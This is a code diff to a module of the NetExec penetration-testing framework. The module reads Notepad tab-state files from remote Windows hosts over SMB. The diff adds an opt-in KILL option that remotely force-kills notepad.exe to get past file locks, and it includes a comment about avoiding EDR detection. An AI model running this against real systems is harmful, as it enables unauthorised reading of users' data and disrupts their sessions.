@@ -37,7 +37,11 @@ class NXCModule:
         self.FILE_PATH_REGEX = r"^[A-Za-z]:\\(?:[^<>:\"/\\|?*]+\\)*[^<>:\"/\\|?*]+\.[\w]{1,5}$"
 
     def options(self, context, module_options):
-        """No options available."""
+        """KILL                // Kill for notepad.exe process. Default False."""
+        if "KILL" not in module_options:
+            self.kill = False
+        else:
+            self.kill = module_options["KILL"]
 
     def extract_strings(self, data, min_length=4):
         """Extract printable strings from binary data, similar to the strings command."""
@@ -91,16 +95,20 @@ class NXCModule:
             connection.conn.getFile("C$", file_path, buf.write)
         except Exception as e:
             if "STATUS_SHARING_VIOLATION" in str(e):  # It means notepad.exe is open on target.
-                # If there's a sharing violation, try alternative approach
-                context.log.debug(f"Sharing violation on {file_path}, trying alternative method")
-                try:
-                    context.log.debug(f"Trying to kill notepad.exe process for {user} user.")
-                    # To Do: Kill process with RPC, connection.execute can be detect by EDRs and module wont work. Or copy the target bin files without trigger the EDRs
-                    connection.execute("taskkill /IM notepad.exe /F")  # If notepad.exe open by user, needs to kill that process for reading files.
-                    time.sleep(1)  # Sleep 1 sec for finding and reading processing
-                    context.log.debug(f"Notepad process was successfully killed for {user}")
-                except Exception as e:
-                    context.log.debug(f"Alternative method failed: {e}")
+                if self.kill:
+                    # If there's a sharing violation, try alternative approach
+                    context.log.debug(f"Sharing violation on {file_path}, trying alternative method")
+                    try:
+                        context.log.debug(f"Trying to kill notepad.exe process for {user} user.")
+                        # To Do: Kill process with RPC, connection.execute can be detect by EDRs and module wont work. Or copy the target bin files without trigger the EDRs
+                        connection.execute("taskkill /IM notepad.exe /F")  # If notepad.exe open by user, needs to kill that process for reading files.
+                        time.sleep(1)  # Sleep 1 sec for finding and reading processing
+                        context.log.debug(f"Notepad process was successfully killed for {user}")
+                    except Exception as e:
+                        context.log.debug(f"Alternative method failed: {e}")
+                else:
+                    context.log.fail("Notepad.exe is open on target. If want to kill process, add kill option true. (-o KILL=True)")
+                    return []
             else:
                 # If it's a different error, just skip this file
                 context.log.debug(f"Error accessing {file_path}: {e}")
@@ -162,6 +170,8 @@ class NXCModule:
                                 output_file.write(f"Source: C:\\{file_path}\n\n")
                                 output_file.write("\n".join(content_lines))  # Write strings line by line
                             context.log.success(f"Notepad tab state content written to: {path}")
+                        else:
+                            break
             except SessionError as e:
                 error = self.get_error_string(e)
                 if error == "STATUS_OBJECT_NAME_NOT_FOUND" or error == "STATUS_OBJECT_PATH_NOT_FOUND":
